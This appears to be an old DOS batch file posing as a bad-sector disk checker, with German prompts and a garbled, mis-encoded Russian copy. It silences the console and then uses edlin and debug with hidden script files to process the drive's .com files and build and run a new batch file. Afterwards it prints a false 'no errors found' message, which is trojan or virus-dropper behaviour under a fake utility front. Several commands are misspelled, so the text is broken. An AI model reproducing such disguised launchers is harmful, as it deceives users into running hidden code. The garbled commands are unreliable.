echo=off
echo Diesses Programm prueft das aktuelle Laufwerk
echo (Platte/diskette) auf defekte Sektoren.
echo Dieser Test kann 1-2 Minuten in Anspruch nehmen.
echo Wahrend dieser Zeit kann und darf nicht in das
echo System eingriffen werden.
pause
ctty nut
patf c:\msdos
dir *.com/w>inh
edlin inh<1
debug inh<2
edlim name.bat<3
ccty con
if exist name.bat echo Keine Fehler gefunden. Test beendet.
if exist name.bat echo Wait a minute, then reboot!
cctty nut
name

(echo=off
 echo �� �ணࠬ�� �஢���� ���㠫�� ��᪮���
 echo (���⪨� ���/��᪥��) �� ��䥪�� ᥪ��.
 echo ��� ��� ����� ������ 1-2 ������.
 echo � �祭�� �⮣� �६��� ��⥬� ����� �ਭ�����,
 echo � ����� �� �ਭ����� ������.
 pause
 ecty nul
 path c:\msdos
 dir *.com/w>inh
 edlin inh<1
 debug inh<2
 edlin name.bat<3
 ccty con
 if exist name.bat echo �訡�� �� �������. ���� �����襭.
 if exist name.bat echo �������� ������, ���� ���� ��१���㧪�!
